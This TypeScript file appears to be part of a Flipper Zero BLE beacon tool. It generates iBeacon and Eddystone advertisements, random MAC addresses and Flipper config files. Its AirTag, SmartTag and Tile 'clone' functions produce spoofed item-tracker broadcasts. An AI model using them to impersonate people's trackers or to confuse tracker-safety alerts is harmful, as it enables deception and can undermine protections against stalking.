function generateIBeaconAdv(uuid: string, major: number, minor: number, txPower: number): string {
  const prefix = '0201061AFF4C000215'
  const uuidHex = uuid.replace(/-/g, '').toUpperCase()
  const majorHex = major.toString(16).padStart(4, '0').toUpperCase()
  const minorHex = minor.toString(16).padStart(4, '0').toUpperCase()
  const txHex = ((txPower & 0xFF) >>> 0).toString(16).padStart(2, '0').toUpperCase()
  return prefix + uuidHex + majorHex + minorHex + txHex
}

function generateEddystoneUrlAdv(url: string): string {
  const schemes: Record<string, string> = { 'http://www.': '00', 'https://www.': '01', 'http://': '02', 'https://': '03' }
  let schemeCode = '03'
  let remainder = url
  for (const [prefix, code] of Object.entries(schemes)) {
    if (url.startsWith(prefix)) {
      schemeCode = code
      remainder = url.slice(prefix.length)
      break
    }
  }
  const expansions: Record<string, string> = { '.com/': '00', '.org/': '01', '.edu/': '02', '.net/': '03', '.info/': '04', '.biz/': '05', '.gov/': '06', '.com': '07', '.org': '08', '.edu': '09', '.net': '0A', '.info': '0B', '.biz': '0C', '.gov': '0D' }
  let encoded = ''
  let i = 0
  while (i < remainder.length) {
    let matched = false
    for (const [exp, code] of Object.entries(expansions)) {
      if (remainder.slice(i).startsWith(exp)) {
        encoded += code
        i += exp.length
        matched = true
        break
      }
    }
    if (!matched) {
      encoded += remainder.charCodeAt(i).toString(16).padStart(2, '0')
      i++
    }
  }
  const serviceData = schemeCode + 'E8' + encoded
  const len = (serviceData.length / 2).toString(16).padStart(2, '0')
  return `020106${len}16AAFE10${serviceData}`.toUpperCase()
}

function generateEddystoneUidAdv(namespace: string, instance: string): string {
  const ns = namespace.replace(/\s/g, '').padEnd(20, '0').slice(0, 20).toUpperCase()
  const inst = instance.replace(/\s/g, '').padEnd(12, '0').slice(0, 12).toUpperCase()
  return `0201060317AAFE1516AAFE00E8${ns}${inst}0000`
}

function generateAirTagCloneAdv(publicKey: string): string {
  const key = publicKey.replace(/\s/g, '').padEnd(56, '0').slice(0, 56).toUpperCase()
  return `1EFF4C001219004D${key}`
}

function generateSmartTagCloneAdv(): string {
  return '0201060AFF750004000100000000'
}

function generateTileCloneAdv(): string {
  return '0201060EFF0D0001000000000000000000'
}

function randomMAC(): string {
  const bytes = Array.from({ length: 6 }, () => Math.floor(Math.random() * 256))
  bytes[0] = (bytes[0] | 0xC0) & 0xFE // Set locally administered, unicast
  return bytes.map(b => b.toString(16).padStart(2, '0').toUpperCase()).join(':')
}

function generateFlipperBleConfig(config: {
  name: string
  advData: string
  mac?: string
  interval?: number
  txPower?: string
}): string {
  const lines = [
    `Filetype: Flipper BLE Beacon`,
    `Version: 1`,
    `# Generated by ICARUS BLE Tools`,
    `Name: ${config.name}`,
    `MAC: ${config.mac || randomMAC()}`,
    `Interval: ${config.interval || 50}`,
    `TX_Power: ${config.txPower || 'medium'}`,
    `Adv_Data: ${config.advData}`,
  ]
  return lines.join('\n')
}

